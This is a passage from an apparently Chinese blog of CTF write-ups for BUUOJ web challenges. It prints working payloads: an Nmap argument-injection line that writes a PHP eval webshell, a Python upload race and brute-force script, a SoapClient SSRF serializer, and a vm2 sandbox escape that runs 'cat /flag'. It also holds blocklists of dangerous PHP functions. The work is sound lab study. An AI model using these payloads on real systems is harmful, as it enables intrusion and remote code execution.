class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到过滤了很多命令执行函数，不过看到了魔术方法，应该可以用反序列化的方法达到目的</p><p>这里学到一个很重要的知识点，菜鸡现在才知道！！！</p><p><strong>不在黑盒中的魔术方法用反序列化的数据可以绕过黑盒对命令执行函数的绕过！！！</strong></p><p>学到了学到了，拿这题就简单了，先读取一下根目录下的文件有哪些吧</p><img src="/2020/05/29/buuoj4/2.png" class=""><p>可以看到没有flag文件，那就稍稍找找，在/tmp目录下找到了，下面就读取吧，这里有点小问题，我用readfile读不出，想想还是用序列化吧hhh</p><img src="/2020/05/29/buuoj4/3.png" class=""><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><img src="/2020/05/29/buuoj4/4.png" class=""><p>nmap，找找nmap的常用命令，-oG，将结果Grep保存，构造一句话木马，用-oG保存到文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure><p>弹窗hacker，应该是被过滤了什么，fuzz，php被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?= @eval($_POST["hack"]);?&gt; -oG hack.phtml '</span></span><br></pre></td></tr></table></figure><img src="/2020/05/29/buuoj4/5.png" class=""><p>尝试访问我们打上去的文件，并且给hack传值</p><img src="/2020/05/29/buuoj4/6.png" class=""><p>成功显示phpinfo页面，直接读flag吧</p><img src="/2020/05/29/buuoj4/7.png" class=""><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>开题</p><img src="/2020/05/29/buuoj4/8.png" class=""><p>smarty模板写的，又提示XFF，好像和之前BJD那道差不多，抓包测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：&#123;7+7&#125;</span><br><span class="line">&#x2F;&#x2F;&#x2F;在client-ip处回显14</span><br></pre></td></tr></table></figure><p>找一下smarty模板注入漏洞，拿来直接用，直接能读到根目录下的flag</p><h3 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了师傅们的wp，跟着做的，学习一下</p><p><strong>1：Think PHP上传默认路径</strong></p><p>默认上传路径是/home/index/upload</p><p><strong>2：Think PHP upload()多文件上传</strong> think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测，至于为什么上传两次1.txt,是为了获取php文件的后缀，因为这里的后缀命名方式运用了<strong>uniqid函数</strong>它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。 </p><p><strong>3</strong>.<strong>ThinkPHP 上传文件名爆破</strong></p><p>先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 pyrhon2</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"http://1b021a4c-b72d-4066-a7c8-d04b3a25da01.node3.buuoj.cn/"</span></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"b.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line"><span class="keyword">print</span> param</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/"</span>+param[<span class="string">'url'</span>].split(<span class="string">"/"</span>)[<span class="number">-2</span>]+<span class="string">"/%s.php"</span> % hex(j)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:<span class="comment">#规避过于频繁访问导致的429</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> path</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> j, path, r.status_code</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="LCTF-bestphp’s-revenge（新知识）"><a href="#LCTF-bestphp’s-revenge（新知识）" class="headerlink" title="[LCTF]bestphp’s revenge（新知识）"></a>[LCTF]bestphp’s revenge（新知识）</h3><p>开题，给了源码，审计</p><p>知识点：</p><p>1、SoapClient反序列化导致SSRF</p><p>2、serialize_handler处理session的方式不同导致session注入</p><p>3、crlf漏洞</p><p>SoapClient简介：</p><p>SOAP作为webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。（<a href="https://www.anquanke.com/post/id/153065#h2-1）这篇文章讲的很详细" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1）这篇文章讲的很详细</a></p><p>crlf可以看这篇文章（<a href="https://www.jianshu.com/p/d4c304dbd0af）" target="_blank" rel="noopener">https://www.jianshu.com/p/d4c304dbd0af）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br></pre></td></tr></table></figure><p>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p><p>发现flag.php页面可以访问，给了提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>具体的知识点讲解可以看看别的师傅的，不知道该如何表述，就直接就开始做题吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"htpp://127.0.0.1/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;$url,<span class="string">'location'</span>=&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>,<span class="string">""</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"|"</span>.urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本地环境生成序列化数据，打上去</p><img src="/2020/05/29/buuoj4/10.png" class=""><img src="/2020/05/29/buuoj4/11.png" class=""><img src="/2020/05/29/buuoj4/12.png" class=""><h3 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>对json数据进行解码，再经过is_valid过滤，file_get_contents包含文件内容之后又经过了一次过滤，这里可以用unicode编码进行绕过，用php伪协议读取数据</p><img src="/2020/05/29/buuoj4/13.png" class=""><p>数据base64解码就是flag</p><h3 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h3><p>看到题目第一眼，就想到应该是逃逸题，开题看看吧</p><img src="/2020/05/29/buuoj4/14.png" class=""><p>看这个提示，不确定是不是php，访问一下run online</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"code"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'code'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给的是用php写的码，eval函数在php和node.js中都有，那就看看nodejs报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">    at vm.js:1:1</span><br><span class="line">    at Script.runInContext (vm.js:131:20)</span><br><span class="line">    at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62)</span><br><span class="line">    at &#x2F;app&#x2F;server.js:51:33</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p>下面看wp来做了，说是vm2沙箱逃逸</p><p>这题waf了一些东西，搜来的poc不能直接打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</span><br></pre></td></tr></table></figure><p>直接找了个能用的payload，nodejs也是第一次做，没接触过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码，flag写在了config.php文件中，但是没有办法直接读取，对config.php进行了正则过滤，basename()函数返回路径中的文件名部分，所以这里需要构造空字节来绕过正则匹配，%00没有用，查了一下还有一个%ff，成功</p><img src="/2020/05/29/buuoj4/15.png" class=""><h3 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h3><p>flag要有五个钻石才能买，一分一钻石，只有三分，要想办法搞到五个积分</p><p>先来看看源码吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 